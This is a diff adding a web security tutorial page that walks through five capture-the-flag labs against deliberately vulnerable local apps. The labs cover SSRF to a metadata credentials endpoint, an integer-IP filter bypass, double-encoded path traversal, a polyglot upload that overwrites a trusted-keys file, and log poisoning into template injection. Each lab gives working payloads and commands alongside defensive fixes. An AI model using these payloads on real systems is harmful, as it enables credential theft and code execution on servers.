@@ -1,0 +1,235 @@
+<!DOCTYPE html><html lang="en"><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SSRF and File Attacks | h5i web security tutorial</title><meta name="description" content="Make a server reach internal services, bypass URL filters, preserve encoded paths, overwrite security data, and turn a log file into code.">
+<meta name="author" content="h5i-dev"><meta name="theme-color" content="#D21C1C">
+<meta name="color-scheme" content="dark"><meta name="robots" content="index, follow, max-image-preview:large">
+<link rel="canonical" href="https://h5i.dev/guides/ssrf-and-file-attacks/"><link rel="icon" type="image/png" href="/_static/logo.png">
+<meta property="og:type" content="article"><meta property="og:site_name" content="h5i">
+<meta property="og:title" content="SSRF and File Attacks | h5i web security tutorial"><meta property="og:description" content="Make a server reach internal services, bypass URL filters, preserve encoded paths, overwrite security data, and turn a log file into code.">
+<meta property="og:url" content="https://h5i.dev/guides/ssrf-and-file-attacks/"><meta property="og:image" content="https://h5i.dev/_static/sandboxed-browser-ui.png">
+<meta property="og:image:alt" content="An h5i browser session: the page an AI agent is reading, beside the request log the engine wrote before any bytes moved"><meta property="og:locale" content="en_US">
+<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="SSRF and File Attacks | h5i web security tutorial">
+<meta name="twitter:description" content="Make a server reach internal services, bypass URL filters, preserve encoded paths, overwrite security data, and turn a log file into code."><meta name="twitter:image" content="https://h5i.dev/_static/sandboxed-browser-ui.png">
+<meta name="twitter:image:alt" content="An h5i browser session: the page an AI agent is reading, beside the request log the engine wrote before any bytes moved">
+<script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "TechArticle",
+      "headline": "SSRF and File Attacks",
+      "description": "Make a server reach internal services, bypass URL filters, preserve encoded paths, overwrite security data, and turn a log file into code.",
+      "author": {
+        "@type": "Organization",
+        "name": "h5i-dev"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "name": "h5i"
+      },
+      "datePublished": "2026-09-13",
+      "dateModified": "2026-09-15",
+      "image": "https://h5i.dev/_static/sandboxed-browser-ui.png",
+      "inLanguage": "en",
+      "isPartOf": {
+        "@id": "https://h5i.dev/#website"
+      },
+      "mainEntityOfPage": "https://h5i.dev/guides/ssrf-and-file-attacks/"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "Home",
+          "item": "https://h5i.dev/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Guides",
+          "item": "https://h5i.dev/guides/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "SSRF and File Attacks",
+          "item": "https://h5i.dev/guides/ssrf-and-file-attacks/"
+        }
+      ]
+    }
+  ]
+}</script>
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Archivo:wght@700;800;900&amp;family=Space+Grotesk:wght@300;400;500;700&amp;family=Space+Mono:wght@400;700&amp;display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/_static/blog.css?v=20ea6351e0"><link rel="stylesheet" href="/_static/highlight.css?v=45984d5155">
+</head>
+<body><nav class="blog-nav">
+  <a class="nav-logo" href="/"><img src="/_static/logo.png" alt="h5i"><span>h5i</span></a>
+  <ul class="nav-links">
+    <li><a href="/features/">Features</a></li><li><a href="/guides/">Guides</a></li>
+    <li><a href="/manual/">Manual</a></li><li><a href="/blog/">Blog</a></li>
+    <li><a href="https://github.com/h5i-dev/h5i" class="nav-cta">GitHub &rarr;</a></li>
+  </ul>
+</nav><main class="article-wrap"><article class="post">
+<header><div class="post-eyebrow">Tutorial 07 / Server-side &middot; 2026-09-13</div>
+<h1>SSRF and File Attacks</h1><p class="post-deck">A beginner-friendly CTF tutorial: make a server reach internal services, bypass URL filters, preserve encoded paths, overwrite security data, and turn a log file into code.</p>
+<div class="post-meta"><span>6 min read</span><span>SSRF &middot; Traversal &middot; LFI &middot; Labs 25&ndash;29</span></div></header>
+<p>In <a href="/guides/browser-as-a-weapon/">The Browser as a Weapon</a>, we used a victim’s browser to send authenticated requests. Labs 25–29 of <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial</a> ask a related question:</p>
+<blockquote>
+<p>What can the application server reach, read, or write that we cannot?</p>
+</blockquote>
+<p>We will use <a href="https://github.com/h5i-dev/h5i">h5i</a> to test server-side request forgery, path traversal, upload destinations, and local file inclusion. The targets run locally and are deliberately vulnerable.</p>
+<h2 id="lab-25-ssrf-to-an-internal-metadata-service">Lab 25: SSRF to an internal metadata service</h2>
+<p><strong>Server-side request forgery</strong>, or <strong>SSRF</strong>, occurs when an application fetches a URL supplied by a user. The request originates from the server, so it may reach internal services unavailable to an external visitor.</p>
+<p>Start the link-preview lab:</p>
+<pre><code class="language-bash">$ ./run.sh 25
+$ h5i browser open \
+  'http://127.0.0.1:9250/api/preview?url=http://127.0.0.1:9251/' \
+  --session lab25 --new --capture --allow 127.0.0.1
+</code></pre>
+<p>Port 9251 represents a cloud instance-metadata service. Walk its path:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab25 \
+  --set query.url=http://127.0.0.1:9251/latest/meta-data/iam/security-credentials/
+
+$ h5i websec replay req_0 --session lab25 \
+  --set query.url=http://127.0.0.1:9251/latest/meta-data/iam/security-credentials/linkpreview-role
+</code></pre>
+<p>The second response contains <code>FLAG{ssrf_metadata}</code>.</p>
+<p>The vulnerable application treats a user URL as a safe fetch destination. A defense must parse and resolve the hostname, reject private, loopback, link-local, and otherwise prohibited addresses, and connect to the exact checked IP. Redirects must be checked again.</p>
+<h2 id="lab-26-one-address-several-spellings">Lab 26: one address, several spellings</h2>
+<p>The next lab blocks strings including <code>localhost</code> and <code>127.0.0.1</code>:</p>
+<pre><code class="language-bash">$ ./run.sh 26
+$ h5i browser open 'http://127.0.0.1:9260/' \
+  --session lab26 --new --capture
+</code></pre>
+<p>The resolver accepts other textual forms of the same loopback address. For example, <code>2130706433</code> is the integer representation of <code>127.0.0.1</code>.</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab26 --create \
+  --set path=/api/test \
+  --set query.url=http://2130706433:9261/ops/credentials
+</code></pre>
+<p>The internal service returns <code>FLAG{ssrf_filter_bypass}</code>.</p>
+<p>Other parsers may accept shortened, octal, hexadecimal, or IPv6 forms. Maintaining a blocklist of spellings is therefore insufficient.</p>
+<p>The safe sequence is:</p>
+<ol>
+<li>parse the URL;</li>
+<li>resolve its hostname;</li>
+<li>check every resolved address against the network policy;</li>
+<li>connect to the checked address without resolving it again; and</li>
+<li>repeat the process after every redirect.</li>
+</ol>
+<p>This also prevents DNS rebinding, where a hostname resolves to an allowed address during validation and an internal address during connection.</p>
+<h2 id="lab-27-encoded-path-traversal">Lab 27: encoded path traversal</h2>
+<p>Start the document viewer:</p>
+<pre><code class="language-bash">$ ./run.sh 27
+$ h5i browser open \
+  'http://127.0.0.1:9270/download?file=welcome.md' \
+  --session lab27 --new --capture
+</code></pre>
+<p>The application strips <code>../</code>, but decoding happens in multiple layers. Double-encode the traversal:</p>
+<pre><code class="language-bash">$ UP='%252e%252e%252f'
+</code></pre>
+<p>A normal URL library may parse and reserialize the value before sending it. First record that behavior:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab27 \
+  --set &quot;query.file=${UP}secret%252fflag.txt&quot;
+</code></pre>
+<p>Now place the exact bytes on the HTTP request line:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab27 \
+  --raw-target &quot;/download?file=${UP}secret%252fflag.txt&quot;
+</code></pre>
+<p>The response contains <code>FLAG{path_traversal_encoded}</code>.</p>
+<p><code>--raw-target</code> matters when the representation itself is the payload. It bypasses normal URL parsing for the request target while keeping the request in h5i’s policy and audit trail.</p>
+<p>The server should decode once into a canonical form, resolve the path, and verify that the final path remains inside the permitted directory. Repeated string replacement is not path containment.</p>
+<h2 id="lab-28-upload-outside-the-upload-directory">Lab 28: upload outside the upload directory</h2>
+<p>The avatar service checks that uploaded bytes start with the JPEG magic number, but trusts the supplied filename.</p>
+<pre><code class="language-bash">$ ./run.sh 28
+$ h5i browser open 'http://127.0.0.1:9280/' \
+  --session lab28 --new --capture
+$ WORK=$(mktemp -d)
+$ KEY=&quot;k-pwn-$$&quot;
+</code></pre>
+<p>Create a file that begins like a JPEG and then contains a key the application will parse:</p>
+<pre><code class="language-bash">$ python3 - &quot;$WORK/poly.jpg&quot; &quot;$KEY&quot; &lt;&lt;'PY'
+import sys
+
+data = b&quot;\xff\xd8\xff\xe0&quot; + f&quot;\n{sys.argv[2]}\n&quot;.encode()
+open(sys.argv[1], &quot;wb&quot;).write(data)
+PY
+</code></pre>
+<p>Upload it with a filename that escapes into the configuration directory:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab28 --create \
+  --set method=POST --set path=/api/avatar \
+  --set-file &quot;multipart.file=$WORK/poly.jpg&quot; \
+  --set multipart.file.filename=../config/trusted_keys.txt \
+  --set multipart.file.content_type=image/jpeg
+</code></pre>
+<p>The application re-reads that file when checking admin keys. Supply ours:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab28 --create \
+  --set path=/api/admin/flag \
+  --set &quot;header.X-Api-Key=$KEY&quot;
+</code></pre>
+<p>The result contains <code>FLAG{upload_path_write}</code>.</p>
+<p>Validating file contents answered “Is this a JPEG?” It never answered “Where may this file be written?” Generate storage names server-side, resolve the destination, enforce containment, and keep uploads away from code and configuration.</p>
+<h2 id="lab-29-lfi-log-poisoning-and-template-execution">Lab 29: LFI, log poisoning, and template execution</h2>
+<p>Start the wiki:</p>
+<pre><code class="language-bash">$ ./run.sh 29
+$ h5i browser open \
+  'http://127.0.0.1:9290/view?page=home.md' \
+  --session lab29 --new --capture
+</code></pre>
+<p>Request a missing page. Its error reveals that <code>access.log</code> sits next to the page directory:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab29 \
+  --set query.page=nope
+</code></pre>
+<p>Every request writes its <code>User-Agent</code> into that log. Put a template expression there:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab29 \
+  --set 'header.User-Agent={{page.__init__.__globals__[&quot;RELEASE_KEY&quot;]}}'
+</code></pre>
+<p>Finally, traverse from <code>pages/</code> to the log:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab29 \
+  --set query.page=../access.log
+</code></pre>
+<p>The wiki includes the log and renders it as a template. The expression executes and returns <code>FLAG{lfi_log_poisoning}</code>.</p>
+<p>No single input gave us a template upload. The chain combined:</p>
+<ol>
+<li><strong>local file inclusion</strong>, which reads a path outside the page directory;</li>
+<li><strong>log poisoning</strong>, which places controlled text into an existing file; and</li>
+<li><strong>server-side template injection</strong>, because included files are rendered.</li>
+</ol>
+<p>The fix must close each boundary: enforce path containment, encode or structure log fields, and never render arbitrary included files as templates.</p>
+<h2 id="a-reusable-server-and-file-testing-method">A reusable server-and-file testing method</h2>
+<p>For every server-side fetch, ask which networks and protocols the server can reach. For every file operation, separate three questions:</p>
+<ul>
+<li>Are the bytes allowed?</li>
+<li>Is the destination allowed?</li>
+<li>How will the file be interpreted later?</li>
+</ul>
+<p>Also confirm what actually reached the wire. Encoded traversal and protocol-level payloads frequently fail because the client normalized them before the server saw them.</p>
+<h2 id="summary">Summary</h2>
+<p>SSRF turned the server into an internal client. Alternative address notation bypassed a string filter. A raw encoded target survived normalization, an upload filename overwrote trusted configuration, and an access log became an executable template.</p>
+<pre><code class="language-bash">$ for s in lab25 lab26 lab27 lab28 lab29; do
+    h5i browser close --session &quot;$s&quot;
+  done
+$ rm -rf &quot;$WORK&quot;
+$ ./run.sh stop
+</code></pre>
+<p>In <a href="/guides/http-protocol-attacks/">HTTP Protocol Attacks</a>, we will move below ordinary HTTP requests: desynchronization, injected headers, cache keys, and WebSocket frames.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://github.com/h5i-dev/h5i">h5i</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/25-ssrf-metadata">Lab 25: SSRF to metadata</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/26-ssrf-filter-bypass">Lab 26: SSRF filter bypass</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/27-path-traversal-encoded">Lab 27: Encoded path traversal</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/28-upload-path-write">Lab 28: Upload path write</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/29-lfi-log-poisoning">Lab 29: LFI and log poisoning</a></li>
+</ul>
+
+<a class="next-up" href="/guides/http-protocol-attacks/"><span class="label">Next in the series</span><h3>HTTP Protocol Attacks</h3><p>Control raw request framing, inject headers, poison a shared cache, and test commands carried over WebSockets.</p></a>
+<div class="post-cta"><h3>Run the labs yourself</h3><p>42 deliberately vulnerable applications, one binary, no Docker and no accounts.</p>
+<div class="hero-actions"><a class="btn btn-primary" href="https://github.com/h5i-dev/h5i-tutorial">Open h5i-tutorial</a></div></div>
+</article></main><footer class="blog-footer"><div class="blog-footer-inner">
+  <div class="brand">h5i<span class="red"> / high-five</span></div>
+  <nav class="links"><a href="/">Home</a><a href="/guides/">Guides</a><a href="/blog/">Blog</a><a href="/manual/">Manual</a><a href="https://github.com/h5i-dev/h5i">GitHub</a></nav>
+  <div class="legal">Apache 2.0 &middot; Built with Rust</div>
+</div></footer>
+<script src="/_static/blog.js?v=41dbda103a" defer></script><script src="/_static/highlight.js?v=ed81eee4e6" defer></script></body></html>
